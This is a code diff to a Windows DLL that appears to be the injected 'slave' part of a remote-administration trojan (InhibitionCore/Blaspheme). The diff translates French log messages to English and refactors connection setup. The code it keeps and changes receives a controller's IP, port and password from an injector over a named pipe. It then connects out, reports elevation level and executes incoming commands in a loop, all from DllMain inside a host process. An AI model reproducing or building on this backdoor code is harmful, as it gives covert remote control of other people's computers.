@@ -13,7 +13,7 @@ using namespace System;
 
 void launch()
 {
-    LOG << "Connections...";
+    LOG << "Waiting connection";
     while(true)
     {
 		try
@@ -21,36 +21,31 @@ void launch()
 			if(InhibitionCore::instance().connect())
 			{
 				while(InhibitionCore::instance().process_command());
-				LOG << "Fin de session.";
+				LOG << "Session ending";
 				InhibitionCore::instance().disconnect();
-				LOG << "Connections...";
+				LOG << "Waiting connection";
 			}
 			Sleep(500);
 		}
 		catch(Network::Deconnection&)
 		{
-			LOG << "Deconnexion intempestive.";
+			LOG << "Untimely disconnect";
 			InhibitionCore::instance().disconnect();
 		}
     }
 }
 
-DWORD WINAPI Run(void)
+// il faut récupérer  l'ip, le port, le mot de passe et le nom du client que va
+// nous envoyer l'injecteur
+// pour ce faire, on utilise les "pipe" à la windows (IPC)
+Blaspheme::ConnectionInfo getConnectionInfo()
 {
-	LOG.setHeader("SLAVE");
-#ifdef INNOCENCE_DEBUG
-    //LOG.addObserver(new Common::LogToNetwork("127.0.0.1", 80));
-#endif
-
-	// il faut récupérer  l'ip, le port, le mot de passe et le nom du client que va
-    // nous envoyer l'injecteur
-    // pour ce faire, on utilise les "pipe" à la windows (IPC)
-    Network::Pipe pipe_client;
+	Network::Pipe pipe;
     Blaspheme::ConnectionInfo infos;
-    char blaspheme [Blaspheme::DEFAULT_STR_SIZE];
-    if(pipe_client.connect(PIPE_NAME))
+    if(pipe.connect(PIPE_NAME))
     {
-        pipe_client.recv(blaspheme, Blaspheme::DEFAULT_STR_SIZE);
+		char blaspheme [Blaspheme::DEFAULT_STR_SIZE];
+        pipe.recv(blaspheme, Blaspheme::DEFAULT_STR_SIZE);
         std::string buffer(blaspheme, Blaspheme::DEFAULT_STR_SIZE);
 		size_t end = buffer.find_last_of(MARKER);
 		buffer = buffer.substr(MARKER_SIZE, end+1-2*MARKER_SIZE);
@@ -64,27 +59,27 @@ DWORD WINAPI Run(void)
         std::getline( iss, infos.password, SEPERATOR );
 
         from_string(port_buffer, infos.port);
-        pipe_client.disconnect();
+        pipe.disconnect();
     }
 	else
 	{
-		FATAL_ERROR("Impossible de se connecter au PIPE.");
+		FATAL_ERROR("Unable to connect to pipe");
 	}
+	return infos;
+}
 
-    LOG.addObserver(new Common::LogToNetwork(infos.ip, infos.port));
-	LOG << GetElevationType();
-    InhibitionCore::instance().set_connection_infos(infos);
+DWORD WINAPI run(void)
+{
 	try
 	{
+		LOG.setHeader("SLAVE");
+		Blaspheme::ConnectionInfo infos = getConnectionInfo();
+#ifdef INNOCENCE_DEBUG
+	    LOG.addObserver(new Common::LogToNetwork(infos.ip, infos.port));
+#endif
+		LOG << GetElevationType();
+		InhibitionCore::instance().set_connection_infos(infos);
 		launch();
-	}
-	catch(Network::SocketException& e)
-	{
-		LOG << e.what();
-	}
-	catch(Network::PipeError& e)
-	{
-		LOG << e.what();
 	}
 	catch(std::exception& e)
 	{
@@ -92,11 +87,8 @@ DWORD WINAPI Run(void)
 	}
 	catch(...)
 	{
-		LOG << "Erreur d'origine inconnue.";
+		LOG << "Unknown exception";
 	}
-    LOG << "Client : Ended.";
-    // si une erreur devait survenir, il faut s'assurer que le processus injecté meurre avec la DLL
-    exit(0);
 	return EXIT_SUCCESS;
 }
 
@@ -109,7 +101,7 @@ extern "C" BOOL APIENTRY DllMain (HINSTANCE hModule, DWORD dwMsg, LPVOID lpReser
     {
 		case DLL_PROCESS_ATTACH:
 			DisableThreadLibraryCalls( hModule );
-			threadHandle = CreateThread( NULL, 0, (LPTHREAD_START_ROUTINE)Run, NULL, 0, 0 );
+			threadHandle = CreateThread( NULL, 0, (LPTHREAD_START_ROUTINE)run, NULL, 0, 0 );
 			return (!threadHandle) ? FALSE : TRUE;
 		case DLL_PROCESS_DETACH:
 			TerminateThread(threadHandle, EXIT_SUCCESS);
